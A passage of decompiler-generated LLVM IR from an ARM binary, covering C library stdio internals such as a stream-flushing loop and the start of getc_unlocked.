  %v0_167bc = phi i32 [ %v0_167b0, %dec_label_pc_167b0 ], [ %v2_16790111, %dec_label_pc_16784 ], [ %v2_16790, %dec_label_pc_1679c.dec_label_pc_16790_crit_edge ]
  %v1_167b4 = phi i32 [ %v0_167b0, %dec_label_pc_167b0 ], [ %v2_16784, %dec_label_pc_16784 ], [ %v1_16794.pre, %dec_label_pc_1679c.dec_label_pc_16790_crit_edge ]
  %v3_167b4 = icmp uge i32 %v0_167bc, %v1_167b4
  store i1 %v3_167b4, i1* %cpsr_c.global-to-local, align 1
  %v9_167b4 = icmp eq i32 %v0_167bc, %v1_167b4
  br i1 %v9_167b4, label %dec_label_pc_167bc, label %dec_label_pc_167b4.dec_label_pc_16784_crit_edge

dec_label_pc_167b4.dec_label_pc_16784_crit_edge:  ; preds = %dec_label_pc_167b4
  %v0_16784.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16784

dec_label_pc_167bc:                               ; preds = %dec_label_pc_167b4
  %v2_167bc = icmp ne i32 %v1_167b4, 0
  store i1 %v2_167bc, i1* %cpsr_c.global-to-local, align 1
  %v7_167c0 = icmp slt i32 %v1_167b4, 2
  br i1 %v7_167c0, label %dec_label_pc_167dcthread-pre-split, label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %dec_label_pc_167bc
  %v0_167c4 = load i32, i32* @r7, align 4
  store i32 %v0_167c4, i32* %r0.global-to-local, align 4
  %v0_167c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_167c8 = add i32 %v0_167c8, 129
  store i32 %v1_167c8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167dcthread-pre-split

dec_label_pc_167dcthread-pre-split:               ; preds = %dec_label_pc_167bc, %dec_label_pc_167c4
  %v0_16928.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167dcthread-pre-split, %dec_label_pc_1675c
  %v0_16928.pr = phi i32 [ %v0_16928.pr.pr, %dec_label_pc_167dcthread-pre-split ], [ %v2_16774, %dec_label_pc_1675c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1692818 = icmp eq i32 %v0_16928.pr, 0
  br i1 %v2_1692818, label %dec_label_pc_16930, label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167dc, %dec_label_pc_16924
  %v0_16814 = phi i32 [ %v3_16924, %dec_label_pc_16924 ], [ %v0_16928.pr, %dec_label_pc_167dc ]
  %v1_167ec = inttoptr i32 %v0_16814 to i16*
  %v2_167ec = load i16, i16* %v1_167ec, align 2
  %v3_167ec = zext i16 %v2_167ec to i32
  store i32 %v3_167ec, i32* %r3.global-to-local, align 4
  %v1_167f0 = and i32 %v3_167ec, 64
  %v2_167f0 = icmp eq i32 %v1_167f0, 0
  br i1 %v2_167f0, label %dec_label_pc_16924, label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167ec
  %v0_167f8 = load i32, i32* @r6, align 4
  %v1_167f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_167f8 = add i32 %v1_167f8, %v0_167f8
  %v3_167f8 = inttoptr i32 %v2_167f8 to i32*
  %v4_167f8 = load i32, i32* %v3_167f8, align 4
  store i32 %v4_167f8, i32* %r3.global-to-local, align 4
  %v1_167fc = inttoptr i32 %v4_167f8 to i32*
  %v2_167fc = load i32, i32* %v1_167fc, align 4
  store i32 %v2_167fc, i32* %r3.global-to-local, align 4
  %v2_16800 = icmp ugt i32 %v2_167fc, 1
  store i1 %v2_16800, i1* %cpsr_c.global-to-local, align 1
  %v7_16800 = icmp eq i32 %v2_167fc, 2
  br i1 %v7_16800, label %dec_label_pc_16864, label %dec_label_pc_16808

dec_label_pc_16808:                               ; preds = %dec_label_pc_167f8
  %v1_16808 = add i32 %v0_16814, 64
  %v2_16808 = inttoptr i32 %v1_16808 to i32*
  %v3_16808 = load i32, i32* %v2_16808, align 4
  store i32 %v3_16808, i32* %r3.global-to-local, align 4
  %v1_1680c = load i32, i32* %r8.global-to-local, align 4
  %v3_1680c = icmp uge i32 %v3_16808, %v1_1680c
  store i1 %v3_1680c, i1* %cpsr_c.global-to-local, align 1
  %v9_1680c = icmp eq i32 %v3_16808, %v1_1680c
  br i1 %v9_1680c, label %dec_label_pc_16858, label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %dec_label_pc_16808
  %v1_16814 = add i32 %v0_16814, 56
  store i32 %v1_16814, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16814, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1682486 = inttoptr i32 %v1_16814 to i32*
  %v2_1682487 = load i32, i32* %v1_1682486, align 4
  store i32 %v2_1682487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1682894 = icmp eq i32 %v2_1682487, 0
  br i1 %v9_1682894, label %dec_label_pc_16830, label %dec_label_pc_16848

dec_label_pc_16830:                               ; preds = %dec_label_pc_16814, %dec_label_pc_16830.dec_label_pc_16824_crit_edge
  %v0_1683095 = phi i32 [ %v1_16828.pre, %dec_label_pc_16830.dec_label_pc_16824_crit_edge ], [ 0, %dec_label_pc_16814 ]
  store i32 %v0_1683095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16840 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16840, label %dec_label_pc_16844, label %dec_label_pc_16830.dec_label_pc_16824_crit_edge

dec_label_pc_16830.dec_label_pc_16824_crit_edge:  ; preds = %dec_label_pc_16830
  %v0_16824.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16828.pre = load i32, i32* @r4, align 4
  %v1_16824 = inttoptr i32 %v0_16824.pre to i32*
  %v2_16824 = load i32, i32* %v1_16824, align 4
  store i32 %v2_16824, i32* %r3.global-to-local, align 4
  %v3_16828 = icmp uge i32 %v2_16824, %v1_16828.pre
  store i1 %v3_16828, i1* %cpsr_c.global-to-local, align 1
  %v9_16828 = icmp eq i32 %v2_16824, %v1_16828.pre
  br i1 %v9_16828, label %dec_label_pc_16830, label %dec_label_pc_16848

dec_label_pc_16844:                               ; preds = %dec_label_pc_16830
  %v0_16844 = load i32, i32* @r4, align 4
  store i32 %v0_16844, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_16814, %dec_label_pc_16830.dec_label_pc_16824_crit_edge, %dec_label_pc_16844
  %v0_16848 = phi i32 [ %v0_16844, %dec_label_pc_16844 ], [ %v2_1682487, %dec_label_pc_16814 ], [ %v2_16824, %dec_label_pc_16830.dec_label_pc_16824_crit_edge ]
  %v1_16848 = phi i32 [ %v0_16844, %dec_label_pc_16844 ], [ 0, %dec_label_pc_16814 ], [ %v1_16828.pre, %dec_label_pc_16830.dec_label_pc_16824_crit_edge ]
  %v3_16848 = icmp uge i32 %v0_16848, %v1_16848
  store i1 %v3_16848, i1* %cpsr_c.global-to-local, align 1
  %v9_16848 = icmp eq i32 %v0_16848, %v1_16848
  br i1 %v9_16848, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16848
  %v1_1684c = load i32, i32* @r7, align 4
  store i32 %v1_1684c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16848, %bb69
  %v1_16850 = xor i1 %v9_16848, true
  call void @__pseudo_cond_branch(i1 %v1_16850, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_16854 = load i32, i32* %r8.global-to-local, align 4
  %v1_16854 = load i32, i32* @r5, align 4
  %v2_16854 = add i32 %v1_16854, 64
  %v3_16854 = inttoptr i32 %v2_16854 to i32*
  store i32 %v0_16854, i32* %v3_16854, align 4
  %v0_16858.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16858

dec_label_pc_16858:                               ; preds = %dec_label_pc_16808, %bb70
  %v0_16858 = phi i32 [ %v0_16814, %dec_label_pc_16808 ], [ %v0_16858.pre, %bb70 ]
  %v1_16858 = add i32 %v0_16858, 60
  %v2_16858 = inttoptr i32 %v1_16858 to i32*
  %v3_16858 = load i32, i32* %v2_16858, align 4
  %v1_1685c = add i32 %v3_16858, 1
  store i32 %v1_1685c, i32* %r3.global-to-local, align 4
  store i32 %v1_1685c, i32* %v2_16858, align 4
  %v0_16864.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16864

dec_label_pc_16864:                               ; preds = %dec_label_pc_167f8, %dec_label_pc_16858
  %v0_1687c = phi i32 [ %v0_16814, %dec_label_pc_167f8 ], [ %v0_16864.pre, %dec_label_pc_16858 ]
  %v1_16864 = inttoptr i32 %v0_1687c to i16*
  %v2_16864 = load i16, i16* %v1_16864, align 2
  %v3_16864 = zext i16 %v2_16864 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1686c = or i32 %v3_16864, %stack_var_-44.1
  %v1_16870 = xor i32 %v2_1686c, 320
  store i32 %v1_16870, i32* %r3.global-to-local, align 4
  %v1_16874 = and i32 %v1_16870, 832
  %v2_16874 = icmp eq i32 %v1_16874, 0
  br i1 %v2_16874, label %dec_label_pc_1687c, label %bb71

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16864
  store i32 %v0_1687c, i32* %r0.global-to-local, align 4
  %v1_16880 = call i32 @__stdio_wcommit(i32 %v0_1687c)
  store i32 %v1_16880, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16884 = icmp eq i32 %v1_16880, 0
  br i1 %v2_16884, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1687c
  %v1_16888 = load i32, i32* @r5, align 4
  %v2_16888 = inttoptr i32 %v1_16888 to i16*
  %v3_16888 = load i16, i16* %v2_16888, align 2
  %v4_16888 = zext i16 %v3_16888 to i32
  store i32 %v4_16888, i32* %r3.global-to-local, align 4
  %v2_1688c = add i32 %v1_16888, 8
  %v3_1688c = inttoptr i32 %v2_1688c to i32*
  %v4_1688c = load i32, i32* %v3_1688c, align 4
  store i32 %v4_1688c, i32* %r2.global-to-local, align 4
  %v2_16890 = and i32 %v4_16888, 65471
  store i32 %v2_16890, i32* %r3.global-to-local, align 4
  %v3_16894 = add i32 %v1_16888, 28
  %v4_16894 = inttoptr i32 %v3_16894 to i32*
  store i32 %v4_1688c, i32* %v4_16894, align 4
  %v1_16898 = load i32, i32* %r3.global-to-local, align 4
  %v2_16898 = trunc i32 %v1_16898 to i16
  %v3_16898 = load i32, i32* @r5, align 4
  %v4_16898 = inttoptr i32 %v3_16898 to i16*
  store i16 %v2_16898, i16* %v4_16898, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1687c
  %v1_1689c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1689c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16864, %.thread7
  %v0_168a0 = load i32, i32* @r6, align 4
  %v1_168a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_168a0 = add i32 %v1_168a0, %v0_168a0
  %v3_168a0 = inttoptr i32 %v2_168a0 to i32*
  %v4_168a0 = load i32, i32* %v3_168a0, align 4
  store i32 %v4_168a0, i32* %r3.global-to-local, align 4
  %v1_168a4 = inttoptr i32 %v4_168a0 to i32*
  %v2_168a4 = load i32, i32* %v1_168a4, align 4
  store i32 %v2_168a4, i32* %r3.global-to-local, align 4
  %v2_168a8 = icmp ugt i32 %v2_168a4, 1
  store i1 %v2_168a8, i1* %cpsr_c.global-to-local, align 1
  %v7_168a8 = icmp eq i32 %v2_168a4, 2
  br i1 %v7_168a8, label %dec_label_pc_16924, label %dec_label_pc_168b0

dec_label_pc_168b0:                               ; preds = %bb71
  %v0_168b0 = load i32, i32* @r5, align 4
  %v1_168b0 = add i32 %v0_168b0, 60
  %v2_168b0 = inttoptr i32 %v1_168b0 to i32*
  %v3_168b0 = load i32, i32* %v2_168b0, align 4
  %v1_168b4 = add i32 %v3_168b0, -1
  store i32 %v1_168b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168b8 = icmp eq i32 %v1_168b4, 0
  store i32 %v1_168b4, i32* %v2_168b0, align 4
  br i1 %v2_168b8, label %dec_label_pc_168c4, label %dec_label_pc_16924

dec_label_pc_168c4:                               ; preds = %dec_label_pc_168b0
  %v0_168c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_168c4 = load i32, i32* @r5, align 4
  %v2_168c4 = add i32 %v1_168c4, 64
  %v3_168c4 = inttoptr i32 %v2_168c4 to i32*
  store i32 %v0_168c4, i32* %v3_168c4, align 4
  %v0_168c8 = load i32, i32* @r5, align 4
  %v1_168c8 = add i32 %v0_168c8, 56
  store i32 %v1_168c8, i32* @r7, align 4
  br label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %dec_label_pc_168fc.dec_label_pc_168cc_crit_edge, %dec_label_pc_168c4
  %v0_168d4 = phi i32 [ %v0_168d4.pre, %dec_label_pc_168fc.dec_label_pc_168cc_crit_edge ], [ %v1_168c8, %dec_label_pc_168c4 ]
  %v0_168cc = phi i32 [ %v0_168cc.pre, %dec_label_pc_168fc.dec_label_pc_168cc_crit_edge ], [ %v0_168c8, %dec_label_pc_168c4 ]
  %v1_168cc = add i32 %v0_168cc, 56
  %v2_168cc = inttoptr i32 %v1_168cc to i32*
  %v3_168cc = load i32, i32* %v2_168cc, align 4
  store i32 %v3_168cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_168d4, i32* %r2.global-to-local, align 4
  %v1_168d897 = inttoptr i32 %v0_168d4 to i32*
  %v2_168d898 = load i32, i32* %v1_168d897, align 4
  store i32 %v2_168d898, i32* %r3.global-to-local, align 4
  %v3_168dc100 = icmp uge i32 %v2_168d898, %v3_168cc
  store i1 %v3_168dc100, i1* %cpsr_c.global-to-local, align 1
  %v9_168dc106 = icmp eq i32 %v2_168d898, %v3_168cc
  br i1 %v9_168dc106, label %dec_label_pc_168e4, label %dec_label_pc_168fc

dec_label_pc_168e4:                               ; preds = %dec_label_pc_168cc, %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge
  %v0_168e4107 = phi i32 [ %v1_168dc.pre, %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge ], [ %v3_168cc, %dec_label_pc_168cc ]
  store i32 %v0_168e4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_168f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_168f4, label %dec_label_pc_168f8, label %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge

dec_label_pc_168e4.dec_label_pc_168d8_crit_edge:  ; preds = %dec_label_pc_168e4
  %v0_168d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_168dc.pre = load i32, i32* @r4, align 4
  %v1_168d8 = inttoptr i32 %v0_168d8.pre to i32*
  %v2_168d8 = load i32, i32* %v1_168d8, align 4
  store i32 %v2_168d8, i32* %r3.global-to-local, align 4
  %v3_168dc = icmp uge i32 %v2_168d8, %v1_168dc.pre
  store i1 %v3_168dc, i1* %cpsr_c.global-to-local, align 1
  %v9_168dc = icmp eq i32 %v2_168d8, %v1_168dc.pre
  br i1 %v9_168dc, label %dec_label_pc_168e4, label %dec_label_pc_168fc

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168e4
  %v0_168f8 = load i32, i32* @r4, align 4
  store i32 %v0_168f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %dec_label_pc_168cc, %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge, %dec_label_pc_168f8
  %v0_16904 = phi i32 [ %v0_168f8, %dec_label_pc_168f8 ], [ %v2_168d898, %dec_label_pc_168cc ], [ %v2_168d8, %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge ]
  %v1_168fc = phi i32 [ %v0_168f8, %dec_label_pc_168f8 ], [ %v3_168cc, %dec_label_pc_168cc ], [ %v1_168dc.pre, %dec_label_pc_168e4.dec_label_pc_168d8_crit_edge ]
  %v3_168fc = icmp uge i32 %v0_16904, %v1_168fc
  store i1 %v3_168fc, i1* %cpsr_c.global-to-local, align 1
  %v9_168fc = icmp eq i32 %v0_16904, %v1_168fc
  br i1 %v9_168fc, label %dec_label_pc_16904, label %dec_label_pc_168fc.dec_label_pc_168cc_crit_edge

dec_label_pc_168fc.dec_label_pc_168cc_crit_edge:  ; preds = %dec_label_pc_168fc
  %v0_168cc.pre = load i32, i32* @r5, align 4
  %v0_168d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_168cc

dec_label_pc_16904:                               ; preds = %dec_label_pc_168fc
  %v2_16904 = icmp ne i32 %v1_168fc, 0
  store i1 %v2_16904, i1* %cpsr_c.global-to-local, align 1
  %v7_16908 = icmp slt i32 %v1_168fc, 2
  br i1 %v7_16908, label %dec_label_pc_16924, label %dec_label_pc_1690c

dec_label_pc_1690c:                               ; preds = %dec_label_pc_16904
  %v0_1690c = load i32, i32* @r5, align 4
  %v1_1690c = add i32 %v0_1690c, 56
  store i32 %v1_1690c, i32* %r0.global-to-local, align 4
  %v0_16910 = load i32, i32* %r1.global-to-local, align 4
  %v1_16910 = add i32 %v0_16910, 129
  store i32 %v1_16910, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_168b0, %dec_label_pc_1690c, %dec_label_pc_16904, %bb71, %dec_label_pc_167ec
  %v0_16924 = load i32, i32* @r5, align 4
  %v1_16924 = add i32 %v0_16924, 32
  %v2_16924 = inttoptr i32 %v1_16924 to i32*
  %v3_16924 = load i32, i32* %v2_16924, align 4
  store i32 %v3_16924, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16928 = icmp eq i32 %v3_16924, 0
  br i1 %v2_16928, label %dec_label_pc_16930, label %dec_label_pc_167ec

dec_label_pc_16930:                               ; preds = %dec_label_pc_16924, %dec_label_pc_167dc
  %v0_16930 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16930, i32* %r0.global-to-local, align 4
  %v0_1696c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16938:                               ; preds = %dec_label_pc_16614
  %v3_16938 = load i16, i16* %arg1, align 2
  %v4_16938 = zext i16 %v3_16938 to i32
  %v1_1693c = and i32 %v4_16938, 64
  store i32 %v1_1693c, i32* %r3.global-to-local, align 4
  %v2_1693c = icmp eq i32 %v1_1693c, 0
  br i1 %v2_1693c, label %bb72, label %dec_label_pc_16948

bb72:                                             ; preds = %dec_label_pc_16938
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16948:                               ; preds = %dec_label_pc_16938
  %v2_16948 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16948, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1694c = icmp eq i32 %v2_16948, 0
  br i1 %v2_1694c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16948
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16948
  %v1_16950 = load i32, i32* @r4, align 4
  %v2_16950 = inttoptr i32 %v1_16950 to i16*
  %v3_16950 = load i16, i16* %v2_16950, align 2
  %v4_16950 = zext i16 %v3_16950 to i32
  store i32 %v4_16950, i32* %r3.global-to-local, align 4
  %v2_16954 = add i32 %v1_16950, 8
  %v3_16954 = inttoptr i32 %v2_16954 to i32*
  %v4_16954 = load i32, i32* %v3_16954, align 4
  store i32 %v4_16954, i32* %r2.global-to-local, align 4
  %v2_16958 = and i32 %v4_16950, 65471
  store i32 %v2_16958, i32* %r3.global-to-local, align 4
  %v2_1695c = trunc i32 %v2_16958 to i16
  store i16 %v2_1695c, i16* %v2_16950, align 2
  %v1_16960 = load i32, i32* %r2.global-to-local, align 4
  %v2_16960 = load i32, i32* @r4, align 4
  %v3_16960 = add i32 %v2_16960, 28
  %v4_16960 = inttoptr i32 %v3_16960 to i32*
  store i32 %v1_16960, i32* %v4_16960, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16930, %.thread14
  %v0_1696c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1696c.pre, %dec_label_pc_16930 ], [ 0, %.thread14 ]
  store i32 %v0_1696c, i32* %r0.global-to-local, align 4
  store i32 %v6_165e8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1696c

; uselistorder directives
  uselistorder i32 %v0_1696c, { 1, 0 }
  uselistorder i32 %v3_16924, { 1, 2, 0 }
  uselistorder i32 %v0_168f8, { 1, 0, 2 }
  uselistorder i32 %v1_168dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1687c, { 1, 0, 2 }
  uselistorder i32 %v0_16844, { 1, 0, 2 }
  uselistorder i32 %v1_16828.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1680c, { 1, 0 }
  uselistorder i32 %v0_167b0, { 1, 0, 2 }
  uselistorder i32 %v1_16794.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16784, { 1, 0 }
  uselistorder i32 %v0_16748, { 1, 0, 2 }
  uselistorder i32 %v1_1672c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16714, { 1, 0 }
  uselistorder i32 %v0_166dc, { 1, 0, 2 }
  uselistorder i32 %v1_166c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_166b0, { 1, 0 }
  uselistorder i32 %v0_1666c, { 1, 0, 2 }
  uselistorder i32 %v1_16650.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16628, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 10, 9, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 54, 23, 24, 25, 26, 27, 28, 30, 29, 55, 31, 32, 33, 34, 36, 35, 1, 37, 38, 39, 40, 42, 41, 2, 43, 44, 45, 46, 48, 47, 3, 49, 50, 53, 51, 52 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 15, 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 38, 39, 13, 14, 40, 16, 17, 19, 18, 0, 20, 21, 22, 34, 35, 23, 24, 25, 26, 36, 37, 27, 28, 30, 29, 2, 31, 32, 33 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16924, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_168fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_168e4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16864, { 1, 0 }
  uselistorder label %dec_label_pc_16858, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16848, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16830, { 1, 0 }
  uselistorder label %dec_label_pc_167ec, { 1, 0 }
  uselistorder label %dec_label_pc_167dcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_167b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1679c, { 1, 0 }
  uselistorder label %dec_label_pc_1675c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1674c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16734, { 1, 0 }
  uselistorder label %dec_label_pc_16708, { 1, 2, 0 }
  uselistorder label %dec_label_pc_166e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166c8, { 1, 0 }
  uselistorder label %dec_label_pc_16680, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16670, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16658, { 1, 0 }
  uselistorder label %dec_label_pc_16624, { 1, 0 }
}

define i32 @function_16980(i32 %arg1) local_unnamed_addr {
dec_label_pc_16980:
  %v0_16980 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16980, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16980
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16980, %bb
  %v10_16990 = phi i32 [ %arg1, %dec_label_pc_16980 ], [ 0, %bb ]
  ret i32 %v10_16990

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16994 = load i32, i32* @r4, align 4
  store i32 %v3_16994, i32* %stack_var_-12, align 4
  %v6_16994 = load i32, i32* @r5, align 4
  %v9_16994 = load i32, i32* @lr, align 4
  %v0_16998 = load i32, i32* @r0, align 4
  %v1_16998 = add i32 %v0_16998, 16
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  store i32 %v3_16998, i32* %r2.global-to-local, align 4
  %v1_1699c = add i32 %v0_16998, 24
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  %v3_1699c = load i32, i32* %v2_1699c, align 4
  %v3_169a0 = icmp ult i32 %v3_16998, %v3_1699c
  store i32 %v0_16998, i32* @r4, align 4
  br i1 %v3_169a0, label %bb, label %dec_label_pc_169c0

bb:                                               ; preds = %entry
  %v2_169ac = inttoptr i32 %v3_16998 to i8*
  %v3_169ac = load i8, i8* %v2_169ac, align 1
  %v4_169ac = zext i8 %v3_169ac to i32
  store i32 %v4_169ac, i32* %r0.global-to-local, align 4
  %v6_169ac = add i32 %v3_16998, 1
  store i32 %v6_169ac, i32* %r2.global-to-local, align 4
  store i32 %v6_169ac, i32* %v2_16998, align 4
  br label %dec_label_pc_16aac

dec_label_pc_169c0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r5, align 4
  %v1_169c0 = inttoptr i32 %v0_16998 to i16*
  %v2_169c0 = load i16, i16* %v1_169c0, align 2
  %v3_169c0 = zext i16 %v2_169c0 to i32
  %v1_169c4 = and i32 %v3_169c0, 131
  %tmp25 = icmp ugt i32 %v1_169c4, 128
  br i1 %tmp25, label %dec_label_pc_169e0, label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169c0
  store i32 128, i32* @r1, align 4
  %v0_169d4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_169d4, i32* %r0.global-to-local, align 4
  %v2_169d8 = icmp eq i32 %v0_169d4, 0
  br i1 %v2_169d8, label %dec_label_pc_169d0.dec_label_pc_169e0_crit_edge, label %dec_label_pc_16aa8

dec_label_pc_169d0.dec_label_pc_169e0_crit_edge:  ; preds = %dec_label_pc_169d0
  %v0_169e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169d0.dec_label_pc_169e0_crit_edge, %dec_label_pc_169c0
  %v2_16a20 = phi i32 [ %v0_169e0.pre, %dec_label_pc_169d0.dec_label_pc_169e0_crit_edge ], [ %v0_16998, %dec_label_pc_169c0 ]
  %v1_169e0 = inttoptr i32 %v2_16a20 to i16*
  %v2_169e0 = load i16, i16* %v1_169e0, align 2
  %v3_169e0 = zext i16 %v2_169e0 to i32
  store i32 %v3_169e0, i32* %r2.global-to-local, align 4
  %v1_169e4 = and i32 %v3_169e0, 2
  %v2_169e4 = icmp eq i32 %v1_169e4, 0
